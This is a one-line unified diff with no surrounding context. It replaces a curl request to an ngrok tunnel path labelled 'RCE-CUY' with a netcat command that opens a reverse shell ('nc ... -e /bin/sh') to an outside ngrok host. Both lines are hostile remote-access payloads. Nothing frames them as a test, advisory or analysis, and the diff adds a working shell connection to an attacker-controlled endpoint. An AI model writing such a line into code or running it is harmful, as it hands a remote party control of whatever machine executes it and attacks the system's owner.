@@ -1,1 +1,1 @@
-curl http://30c6-36-68-54-16.ngrok.io/RCE-CUY
+nc 0.tcp.ngrok.io 19260 -e /bin/sh
